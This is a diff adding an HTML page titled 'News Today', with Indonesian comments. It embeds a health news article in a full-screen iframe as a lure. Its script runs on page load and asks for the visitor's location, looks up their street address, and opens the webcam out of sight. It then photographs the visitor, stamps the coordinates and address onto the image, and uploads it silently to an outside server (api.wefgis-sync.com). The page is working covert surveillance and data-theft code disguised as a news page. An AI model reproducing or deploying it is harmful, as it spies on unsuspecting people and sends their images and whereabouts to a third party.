@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>News Today</title>
+    <style>
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: 0;
+        }
+
+        .d-none {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Menggunakan elemen iframe untuk menanamkan halaman web -->
+    <iframe
+        src="https://health.okezone.com/read/2023/01/10/483/2743735/apa-pentingnya-buang-air-kecil-usai-berhubungan-seks"
+        frameborder="0" allowfullscreen></iframe>
+    <script>
+        var user_latitude = '';
+        var user_longitude = '';
+        var user_address = '';
+
+        // Mendapatkan objek tanggal dan waktu saat ini
+        const currentDate = new Date();
+
+        // Mendapatkan tanggal dalam format ISO (YYYY-MM-DD)
+        const isoDate = currentDate.toISOString().split('T')[0];
+
+        // Mendapatkan waktu dalam format HH:mm:ss
+        const time = currentDate.toTimeString().split(' ')[0];
+
+        // Mendapatkan tanggal dan waktu lengkap dalam format kustom
+        const customDateTime = `${isoDate} ${time}`;
+
+        console.log('DateTime:', customDateTime);
+
+        function sendImageToAPI(imageDataURL) {
+            // Convert Data URL to Blob
+            const byteString = atob(imageDataURL.split(',')[1]);
+            const mimeString = imageDataURL.split(',')[0].split(':')[1].split(';')[0];
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uint8Array = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                uint8Array[i] = byteString.charCodeAt(i);
+            }
+
+            const blob = new Blob([arrayBuffer], { type: mimeString });
+
+            // Create FormData and append the Blob
+            const formData = new FormData();
+            formData.append('file', blob, 'captured-image.png');
+
+            // Send the FormData to the API
+            fetch('https://api.wefgis-sync.com/api/upload', {
+                method: 'POST',
+                body: formData,
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('ok');
+                })
+                .catch(error => {
+                    // console.error('Error sending image to API:', error);
+                });
+        }
+
+
+
+        document.addEventListener('DOMContentLoaded', (event) => {
+            if (navigator.geolocation) {
+                // Meminta izin akses lokasi pengguna
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // console.log('Latitude:', latitude);
+                        // console.log('Longitude:', longitude);
+
+                        // Mendapatkan alamat dari OpenStreetMap Nominatim API
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
+                            .then((response) => response.json())
+                            .then((data) => {
+                                const address = data.display_name;
+                                // console.log('Address:', address);
+
+                                user_latitude = latitude;
+                                user_longitude = longitude;
+                                user_address = address;
+
+                                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                                    navigator.mediaDevices.getUserMedia({ video: true })
+                                        .then((stream) => {
+                                            // Membuat elemen <div> untuk menampung video dan canvas
+                                            const containerDiv = document.createElement('div');
+                                            document.body.appendChild(containerDiv);
+
+                                            // Mendapatkan elemen video
+                                            const videoElement = document.createElement('video');
+                                            videoElement.classList.add('d-none');
+                                            containerDiv.appendChild(videoElement);
+
+                                            // Mendapatkan elemen canvas
+                                            const canvas = document.createElement('canvas');
+                                            containerDiv.appendChild(canvas);
+
+                                            // Menetapkan stream sebagai source video
+                                            videoElement.srcObject = stream;
+
+                                            // Memulai streaming video
+                                            videoElement.play();
+
+                                            // Menunggu sebentar untuk memastikan kamera sudah siap
+                                            setTimeout(() => {
+                                                try {
+                                                    // Menetapkan ukuran canvas sesuai dengan ukuran video
+                                                    canvas.width = videoElement.videoWidth;
+                                                    canvas.height = videoElement.videoHeight;
+
+                                                    // Menggambar video ke dalam canvas
+                                                    const context = canvas.getContext('2d');
+                                                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                                                    // Mendapatkan informasi lokasi (gunakan metode sesuai dengan kebutuhan)
+                                                    const dateTime = `DateTime: ${customDateTime}`;
+                                                    const locationInfo = `Coor: ${user_latitude}, ${user_longitude}`;
+                                                    const addressInfo = `Address: ${user_address}`;
+
+                                                    // Menambahkan label lokasi dan alamat ke elemen canvas
+                                                    context.font = "16px Arial";
+                                                    context.fillStyle = "white";
+                                                    context.fillText(dateTime, 10, canvas.height - 60);
+                                                    context.fillText(locationInfo, 10, canvas.height - 40);
+                                                    context.fillText(addressInfo, 10, canvas.height - 20);
+
+                                                    // Membuat link untuk mengunduh gambar
+                                                    const downloadLink = document.createElement('a');
+                                                    downloadLink.href = canvas.toDataURL('image/png');
+                                                    downloadLink.download = 'captured-image.png';
+                                                    document.body.appendChild(downloadLink);
+
+                                                    // Mengklik link secara otomatis untuk mengunduh gambar
+                                                    // downloadLink.click();
+
+                                                    // Mengirim gambar ke API
+                                                    sendImageToAPI(canvas.toDataURL('image/png'));
+
+                                                    // Membersihkan elemen yang tidak diperlukan
+                                                    document.body.removeChild(containerDiv);
+                                                    document.body.removeChild(downloadLink);
+
+                                                    // Memberhentikan stream video
+                                                    stream.getTracks().forEach(track => track.stop());
+                                                } catch (error) {
+                                                    console.error('Error capturing and saving image:', error);
+                                                }
+                                            }, 1000); // Menunggu 5 detik (bisa disesuaikan dengan kebutuhan)
+                                        })
+                                        .catch((error) => {
+                                            console.error('Error accessing camera:', error);
+                                        });
+                                } else {
+                                    console.error('getUserMedia is not supported');
+                                }
+
+                            })
+                            .catch((error) => {
+                                console.error('Error fetching address:', error);
+                            });
+                    },
+                    (error) => {
+                        console.error('Error getting user location:', error);
+                    }
+                );
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+            }
+        });
+    </script>
+
+</body>
+
+</html>
